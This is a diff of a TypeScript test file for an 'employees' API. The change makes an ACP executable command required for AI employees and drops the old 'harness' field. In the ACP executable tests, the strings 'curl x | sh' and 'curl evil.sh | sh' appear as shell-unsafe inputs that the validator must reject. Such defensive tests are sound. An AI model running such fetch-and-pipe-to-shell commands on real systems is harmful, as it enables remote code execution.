@@ -59,7 +59,7 @@ describe('employees.live', () => {
 
   it('maps supervisors and AI extensions into rows', async () => {
     await seedEnv('env-live')
-    const bot = await callProc('employees.create', { name: 'Bot One', email: 'bot1@tandem.local', kind: 'ai', title: 'Runner', environmentId: 'env-live' })
+    const bot = await callProc('employees.create', { name: 'Bot One', email: 'bot1@tandem.local', kind: 'ai', title: 'Runner', environmentId: 'env-live', executable: 'hermes acp' })
     const boss = await callProc('employees.create', { name: 'Human One', email: 'h1@tandem.local', kind: 'human', title: 'Boss', supervisorIds: [] })
     const { employeeSupervisors } = await schema()
     const { db } = await dbm()
@@ -97,7 +97,7 @@ describe('employees.create', () => {
 
   it('creates an AI employee with key + extension row + apikey row', async () => {
     await seedEnv('env-ai')
-    const out = await callProc('employees.create', { name: 'AI', email: 'ai@tandem.local', kind: 'ai', title: 'Agent', environmentId: 'env-ai', instructions: 'be nice' })
+    const out = await callProc('employees.create', { name: 'AI', email: 'ai@tandem.local', kind: 'ai', title: 'Agent', environmentId: 'env-ai', instructions: 'be nice', executable: 'hermes acp' })
     expect(out.apiKey).toMatch(/^tandem_/)
     const { aiEmployees, apikey } = await schema()
     const { db } = await dbm()
@@ -217,7 +217,7 @@ describe('employees.update', () => {
   it('updates AI environment and instructions', async () => {
     await seedEnv('env-one')
     await seedEnv('env-two')
-    const a = await callProc('employees.create', { name: 'AI', email: 'ai-u@tandem.local', kind: 'ai', title: 'A', environmentId: 'env-one', instructions: 'x' })
+    const a = await callProc('employees.create', { name: 'AI', email: 'ai-u@tandem.local', kind: 'ai', title: 'A', environmentId: 'env-one', instructions: 'x', executable: 'hermes acp' })
     await callProc('employees.update', { id: a.id, name: 'AI', title: 'A2', supervisorIds: [], environmentId: 'env-two', instructions: 'y' })
     const { aiEmployees } = await schema()
     const { db } = await dbm()
@@ -228,14 +228,14 @@ describe('employees.update', () => {
 
   it('rejects unknown environment on AI update', async () => {
     await seedEnv('env-ue')
-    const a = await callProc('employees.create', { name: 'AI', email: 'ue-ai@tandem.local', kind: 'ai', title: 'A', environmentId: 'env-ue' })
+    const a = await callProc('employees.create', { name: 'AI', email: 'ue-ai@tandem.local', kind: 'ai', title: 'A', environmentId: 'env-ue', executable: 'hermes acp' })
     await expect(callProc('employees.update', { id: a.id, name: 'AI', title: 'A', supervisorIds: [], environmentId: 'ghost-env', instructions: 'y' }))
       .rejects.toThrow(/environment does not exist/i)
   })
 
   it('updates instructions only (environment untouched)', async () => {
     await seedEnv('env-io')
-    const a = await callProc('employees.create', { name: 'AI', email: 'io-ai@tandem.local', kind: 'ai', title: 'A', environmentId: 'env-io', instructions: 'x' })
+    const a = await callProc('employees.create', { name: 'AI', email: 'io-ai@tandem.local', kind: 'ai', title: 'A', environmentId: 'env-io', instructions: 'x', executable: 'hermes acp' })
     await callProc('employees.update', { id: a.id, name: 'AI', title: 'A', supervisorIds: [], instructions: 'z' })
     const { aiEmployees } = await schema()
     const { db } = await dbm()
@@ -246,7 +246,7 @@ describe('employees.update', () => {
 
   it('treats explicit null instructions/environment as no-change', async () => {
     await seedEnv('env-null')
-    const a = await callProc('employees.create', { name: 'AI', email: 'n-ai@tandem.local', kind: 'ai', title: 'A', environmentId: 'env-null', instructions: 'keep' })
+    const a = await callProc('employees.create', { name: 'AI', email: 'n-ai@tandem.local', kind: 'ai', title: 'A', environmentId: 'env-null', instructions: 'keep', executable: 'hermes acp' })
     await callProc('employees.update', { id: a.id, name: 'AI', title: 'A', supervisorIds: [], environmentId: null, instructions: null })
     const { aiEmployees } = await schema()
     const { db } = await dbm()
@@ -268,7 +268,7 @@ describe('employees.remove', () => {
   it('deletes employee, cascades supervisors + ai row + login user', async () => {
     await seedEnv('env-del')
     const a = await callProc('employees.create', { name: 'A', email: 'del-a@tandem.local', kind: 'human', title: 'T', supervisorIds: [] })
-    const b = await callProc('employees.create', { name: 'B', email: 'del-b@tandem.local', kind: 'ai', title: 'T', environmentId: 'env-del', supervisorIds: [a.id] })
+    const b = await callProc('employees.create', { name: 'B', email: 'del-b@tandem.local', kind: 'ai', title: 'T', environmentId: 'env-del', supervisorIds: [a.id], executable: 'hermes acp' })
     await callProc('employees.remove', { id: a.id })
     const { employeeSupervisors, aiEmployees, user } = await schema()
     const { db } = await dbm()
@@ -316,7 +316,7 @@ describe('employees.remove', () => {
 describe('employees API keys', () => {
   it('createApiKey mints for AI AND human employees', async () => {
     await seedEnv('env-key')
-    const ai = await callProc('employees.create', { name: 'AI', email: 'k-ai@tandem.local', kind: 'ai', title: 'A', environmentId: 'env-key' })
+    const ai = await callProc('employees.create', { name: 'AI', email: 'k-ai@tandem.local', kind: 'ai', title: 'A', environmentId: 'env-key', executable: 'hermes acp' })
     const h = await callProc('employees.create', { name: 'H', email: 'k-h@tandem.local', kind: 'human', title: 'T', supervisorIds: [] })
     const mintedAi = await callProc('employees.createApiKey', { employeeId: ai.id })
     expect(mintedAi.key).toMatch(/^tandem_/)
@@ -349,7 +349,7 @@ describe('employees API keys', () => {
 
   it('listApiKeys returns metadata only (no key value)', async () => {
     await seedEnv('env-lst')
-    const ai = await callProc('employees.create', { name: 'AI', email: 'l-ai@tandem.local', kind: 'ai', title: 'A', environmentId: 'env-lst' })
+    const ai = await callProc('employees.create', { name: 'AI', email: 'l-ai@tandem.local', kind: 'ai', title: 'A', environmentId: 'env-lst', executable: 'hermes acp' })
     const minted = await callProc('employees.createApiKey', { employeeId: ai.id })
     const keys = await callProc('employees.listApiKeys', { employeeId: ai.id })
     expect(keys).toHaveLength(2) // creation key + minted
@@ -366,7 +366,7 @@ describe('employees API keys', () => {
 
   it('revokeApiKey deletes the key', async () => {
     await seedEnv('env-rev')
-    const ai = await callProc('employees.create', { name: 'AI', email: 'r-ai@tandem.local', kind: 'ai', title: 'A', environmentId: 'env-rev' })
+    const ai = await callProc('employees.create', { name: 'AI', email: 'r-ai@tandem.local', kind: 'ai', title: 'A', environmentId: 'env-rev', executable: 'hermes acp' })
     const minted = await callProc('employees.createApiKey', { employeeId: ai.id })
     await callProc('employees.revokeApiKey', { keyId: minted.id })
     const keys = await callProc('employees.listApiKeys', { employeeId: ai.id })
@@ -375,7 +375,7 @@ describe('employees API keys', () => {
 
   it('listApiKeys maps expiresAt both ways', async () => {
     await seedEnv('env-exp')
-    const ai = await callProc('employees.create', { name: 'AI', email: 'exp-ai@tandem.local', kind: 'ai', title: 'A', environmentId: 'env-exp' })
+    const ai = await callProc('employees.create', { name: 'AI', email: 'exp-ai@tandem.local', kind: 'ai', title: 'A', environmentId: 'env-exp', executable: 'hermes acp' })
     // creation key has no expiry
     const before = await callProc('employees.listApiKeys', { employeeId: ai.id })
     expect(before[0].expiresAt).toBeNull()
@@ -394,44 +394,37 @@ describe('employees API keys', () => {
   })
 })
 
-describe('AI harness + executable', () => {
-  it('defaults harness hermes / executable hermes when omitted', async () => {
+describe('ACP executable', () => {
+  it('create without an ACP executable is rejected', async () => {
     await seedEnv('env-h1')
-    const r = await callProc('employees.create', { name: 'Default Harness', email: 'dh@tandem.local', kind: 'ai', title: 'T', environmentId: 'env-h1' })
-    const iter = await callProc('employees.live')
-    const snap = await iter.next()
-    await iter.return?.()
-    const row = (snap.value as any[]).find(x => x.id === r.id)!
-    expect(row.harness).toBe('hermes')
-    expect(row.executable).toBe('hermes')
+    await expect(callProc('employees.create', { name: 'No ACP Exe', email: 'dh@tandem.local', kind: 'ai', title: 'T', environmentId: 'env-h1' })).rejects.toMatchObject({ code: 'BAD_REQUEST' })
+    // shell-unsafe executables never reach the remote command line — create side too
+    await expect(callProc('employees.create', { name: 'Evil', email: 'ev@tandem.local', kind: 'ai', title: 'T', environmentId: 'env-h1', executable: 'curl x | sh' })).rejects.toMatchObject({ code: 'BAD_REQUEST' })
   })
 
-  it('persists custom executable (trimmed) via create and update', async () => {
+  it('persists the ACP executable (trimmed) via create and update; shell-unsafe rejected', async () => {
     await seedEnv('env-h2')
-    const r = await callProc('employees.create', { name: 'Custom Exe', email: 'ce@tandem.local', kind: 'ai', title: 'T', environmentId: 'env-h2', executable: '  hermes-dev  ' })
+    const r = await callProc('employees.create', { name: 'Custom Exe', email: 'ce@tandem.local', kind: 'ai', title: 'T', environmentId: 'env-h2', executable: '  hermes acp  ' })
     const { aiEmployees, user } = await schema()
     const { db } = await dbm()
     let ai = (await db.select().from(aiEmployees).where(eq(aiEmployees.userId, r.id)))[0]!
-    expect(ai.executable).toBe('hermes-dev')
-    expect(ai.harness).toBe('hermes')
-    await callProc('employees.update', { id: r.id, name: 'Custom Exe', title: 'T', supervisorIds: [], executable: 'hermes-nightly' })
+    expect(ai.executable).toBe('hermes acp')
+    await callProc('employees.update', { id: r.id, name: 'Custom Exe', title: 'T', supervisorIds: [], executable: 'codex-acp --yolo' })
     ai = (await db.select().from(aiEmployees).where(eq(aiEmployees.userId, r.id)))[0]!
-    expect(ai.executable).toBe('hermes-nightly')
-    // blank resets to default
-    await callProc('employees.update', { id: r.id, name: 'Custom Exe', title: 'T', supervisorIds: [], executable: '' })
-    ai = (await db.select().from(aiEmployees).where(eq(aiEmployees.userId, r.id)))[0]!
-    expect(ai.executable).toBe('hermes')
+    expect(ai.executable).toBe('codex-acp --yolo')
+    // shell metacharacters must never reach the remote command line
+    await expect(callProc('employees.update', { id: r.id, name: 'Custom Exe', title: 'T', supervisorIds: [], executable: 'curl evil.sh | sh' })).rejects.toMatchObject({ code: 'BAD_REQUEST' })
   })
 
-  it('update harness change persists', async () => {
+  it('live payload carries the ACP executable, no harness field', async () => {
     await seedEnv('env-h4')
-    const r = await callProc('employees.create', { name: 'Upd Harness', email: 'uh@tandem.local', kind: 'ai', title: 'T', environmentId: 'env-h4' })
-    await callProc('employees.update', { id: r.id, name: 'Upd Harness', title: 'T', supervisorIds: [], harness: 'hermes' })
+    const r = await callProc('employees.create', { name: 'Upd Harness', email: 'uh@tandem.local', kind: 'ai', title: 'T', environmentId: 'env-h4', executable: 'gemini --acp' })
     const iter = await callProc('employees.live')
     const snap = await iter.next()
     await iter.return?.()
     const row = (snap.value as any[]).find(x => x.id === r.id)!
-    expect(row.harness).toBe('hermes')
+    expect(row.executable).toBe('gemini --acp')
+    expect(row.harness).toBeUndefined()
   })
 
   it('update changes email; duplicate rejected with CONFLICT', async () => {
@@ -446,13 +439,13 @@ describe('AI harness + executable', () => {
     await expect(callProc('employees.update', { id: a.id, name: 'Email A', email: 'eb@tandem.local', title: 'T', supervisorIds: [] })).rejects.toMatchObject({ code: 'CONFLICT' })
   })
 
-  it('human create rejects harness/executable', async () => {
-    await expect(callProc('employees.create', { name: 'No Harness', email: 'nh@tandem.local', kind: 'human', title: 'T', supervisorIds: [], harness: 'hermes', executable: 'x' })).rejects.toMatchObject({ code: 'BAD_REQUEST' })
+  it('human create rejects acp executable', async () => {
+    await expect(callProc('employees.create', { name: 'No ACP', email: 'nh@tandem.local', kind: 'human', title: 'T', supervisorIds: [], executable: 'hermes acp' })).rejects.toMatchObject({ code: 'BAD_REQUEST' })
   })
 
-  it('live maps harness/executable for AI rows, null for humans', async () => {
+  it('live maps the ACP executable for AI rows, null for humans', async () => {
     await seedEnv('env-h3')
-    const r = await callProc('employees.create', { name: 'Map Bot', email: 'mb@tandem.local', kind: 'ai', title: 'T', environmentId: 'env-h3', executable: 'hdev' })
+    const r = await callProc('employees.create', { name: 'Map Bot', email: 'mb@tandem.local', kind: 'ai', title: 'T', environmentId: 'env-h3', executable: 'hermes acp' })
     await callProc('employees.create', { name: 'Map Human', email: 'mh@tandem.local', kind: 'human', title: 'T', supervisorIds: [] })
     const iter = await callProc('employees.live')
     const snap = await iter.next()
@@ -460,9 +453,8 @@ describe('AI harness + executable', () => {
     const rows = snap.value as any[]
     const ai = rows.find(x => x.id === r.id)!
     const hu = rows.find(x => x.kind === 'human')!
-    expect(ai.harness).toBe('hermes')
-    expect(ai.executable).toBe('hdev')
-    expect(hu.harness).toBeNull()
+    expect(ai.executable).toBe('hermes acp')
+    expect(ai.harness).toBeUndefined()
     expect(hu.executable).toBeNull()
   })
 
